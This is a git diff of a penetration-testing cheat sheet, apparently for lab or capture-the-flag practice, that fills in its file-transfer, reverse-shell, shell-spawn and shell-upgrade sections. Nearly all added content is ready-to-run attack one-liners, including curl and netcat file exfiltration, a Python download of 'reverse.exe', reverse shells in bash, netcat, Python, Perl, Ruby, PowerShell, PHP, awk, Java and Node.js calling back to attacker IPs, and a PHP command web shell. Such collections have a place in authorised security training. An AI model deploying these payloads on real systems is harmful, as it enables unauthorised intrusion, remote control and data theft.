@@ -72,7 +72,7 @@ ssh -i ssh.key -6 user@[IPv6]`
 
 `VHostScan -t megacorpone.com -w ./wordlists/wordlist.txt`
 
-#### 3- VISUAL
+#### 3- VISUAL RECON
 
 ##### LOOK FOR SQL-I, PATH TRAVERSAL, FILE UPLOAD...
 
@@ -172,15 +172,185 @@ custom exploitation
 
 ### FILE TRANSFER
 
-{FILE TRANSFER}
+(WEB SERVER ONE LINERS) https://gist.github.com/willurd/5720255
+
+#### NC
+1 - VICTIM
+nc -l -p 1234 > out.file
+
+2 - ATTACKER
+nc [destination] 1234 < out.file
+
+#### WGET
+wget 10.10.10.10/file
+
+#### CURL
+
+- UPLOAD FILES
+curl -F ‘data=@path/to/local/file’ UPLOAD_ADDRESS
+
+- DOWNLOAD FILES
+curl https://10.10.10.10/file.txt
+
+
+#### PYTHON
+python -c "from urllib import urlretrieve; urlretrieve('http://10.10.14.16/windows/reverse.exe', 'reverse.exe')"
+
+#### POWERSHELL
+powershell.exe (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")
+
+#### PERL
+FILE: #!/usr/bin/perl use LWP::Simple; getstore("http://domain/file", "file");
+
+perl file.pl
+
+#### RUBY
+FILE: #!/usr/bin/ruby require 'net/http' Net::HTTP.start("www.domain.com") { |http| r = http.get("/file") open("save_location", "wb") { |file| file.write(r.body) } } 
+
+ruty file.rb
+
+#### PHP
+FILE: #!/usr/bin/php <?php $data = @file("http://example.com/file"); $lf = "local_file"; $fh = fopen($lf, 'w'); fwrite($fh, $data[0]); fclose($fh); ?>
+
+php file.php
 
 ### REVERSE SHELL
 
-{REVERSE SHELL}
+#### Bash shell TCP
 
-#### UPGRADE SHELL
+bash -i >& /dev/tcp/10.10.14.16/4499 0>&1
 
-{UPGRADE SHELL}
+0<&196;exec 196<>/dev/tcp/10.10.14.16/4499; sh <&196 >&196 2>&196
+
+#### Bash shell UDP
+1 - (ATTACKER) nc -u -lvp 6699
+2 - (VICTIM) sh -i >& /dev/udp/10.10.14.16/6699 0>&1
+
+#### Netcat without -e flag
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f
+
+#### Netcat Linux
+nc -e /bin/sh 10.10.14.16 4499
+
+#### Netcat Linux UDP
+ncat --udp -e /bin/bash 127.0.0.1 4443
+
+#### Netcat Windows
+nc -e cmd.exe 10.10.10.10 4443
+
+#### Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.16",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+p=subprocess.call(["/bin/sh","-i",">&","/dev/tcp/10.10.14.16/4499","0>&1"])
+
+#### Perl
+perl -e 'use Socket;$i="10.10.10.10";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+#### Ruby
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+#### PowerShell
+powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.23',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+#### PHP
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+#### PHP FILES
+<?php echo exec($_GET["cmd"]); ?>
+<?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.16/4499 0>&1'");
+<?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.16/4499 0>&1'");
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.16/4499 0>&1'");
+
+#### AWK
+awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1>/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+
+#### TELNET
+1 - VICTIM 
+rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
+
+2 - ATTACKER
+telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
+
+#### SOCAT
+user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242
+user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4242
+
+#### Xterm
+
+(VICTIM) 
+xterm -display 10.0.0.1:1
+
+(ATTACKER) 
+1) (Start XTerm server) 
+Xnest :1
+
+2) (Authorise target)
+xhost +[TARGET_IP] (Ex: xhost+10.10.14.16)
+
+#### Java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+#### NODE JS
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(5599, "10.10.14.16", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+
+### SPAWN A SHELL
+
+#### BASH
+/bin/sh -i
+(USING FIND) find /etc/passwd -exec /bin/bash ;
+
+#### PYTHON
+python -c 'import pty; pty.spawn("/bin/sh")'
+echo os.system('/bin/bash')
+ 
+#### PERL
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+ 
+#### RUBY
+exec "/bin/sh"
+ 
+#### LUA
+os.execute('/bin/sh')
+ 
+#### IRB
+exec "/bin/sh"
+ 
+#### VI
+:!bash
+:set shell=/bin/bash:shell
+ 
+#### MAP
+	!sh
+
+### UPGRADE SHELL
+
+#### PYTHON
+# Enter while in reverse shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+
+#### SOCAT
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method2usingsocat
+- 1 KALI: 
+socat file:'tty',raw,echo=0 tcp-listen:8888
+
+- 2 VICTIM: 
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.16:8888
+
 
 ## 7) POST EXPLOTATION / PRIVILEGE ESCALATION (USER 2)
 
